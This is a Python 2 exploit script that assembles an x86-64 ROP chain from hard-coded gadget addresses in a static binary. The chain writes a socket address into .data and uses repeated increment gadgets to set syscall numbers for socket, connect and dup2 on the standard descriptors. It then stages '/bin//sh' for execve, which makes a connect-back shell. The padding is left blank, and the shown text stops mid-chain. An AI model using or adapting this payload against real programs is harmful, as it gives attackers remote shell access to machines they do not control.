#!/usr/bin/env python2

import struct

if __name__ == '__main__' : 

	# Enter the amount of junk required
	payload = ''

	payload += struct.pack('<Q', 0x401616)		# Address of pop Reg1; ret
	payload += struct.pack('<Q', 0x6ca080)		# Address of .data section
	payload += struct.pack('<Q', 0x442b16)		# Address of pop Reg2; ret
	payload += struct.pack('<Q', 0x53220002)
	payload += struct.pack('<Q', 0x4356d3)		# Address of pop qword ptr [Reg1], Reg2; ret
	payload += struct.pack('<Q', 0x401616)		# Address of pop Reg1; ret
	payload += struct.pack('<Q', 0x6ca088)		# Address of .data section
	payload += struct.pack('<Q', 0x442b16)		# Address of pop Reg2; ret
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x4356d3)		# Address of pop qword ptr [Reg1], Reg2; ret
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401616)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x2)
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x1)
	payload += struct.pack('<Q', 0x442b16)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x4099f5)		# Address of xchg Reg1, Reg2; ret
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x6ca080)
	payload += struct.pack('<Q', 0x442b16)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x10)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x442b16)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x4099f5)		# Address of xchg Reg1, Reg2; ret
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x0)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x1)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x401737)		# Address of 'pop Reg; ret'
	payload += struct.pack('<Q', 0x2)
	payload += struct.pack('<Q', 0x467635)		# Address of syscall
	payload += struct.pack('<Q', 0x401616)		# Address of pop Reg1; ret
	payload += struct.pack('<Q', 0x6ca094)		# Address of .data section
	payload += struct.pack('<Q', 0x442b16)		# Address of pop Reg2; ret
	payload += struct.pack('<Q', 0x68732f2f6e69622f)
	payload += struct.pack('<Q', 0x4356d3)		# Address of pop qword ptr [Reg1], Reg2; ret
	payload += struct.pack('<Q', 0x466b10)		# Address of 'xor Reg, Reg; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
	payload += struct.pack('<Q', 0x466af0)		# Address of 'add Reg, 1; ret'
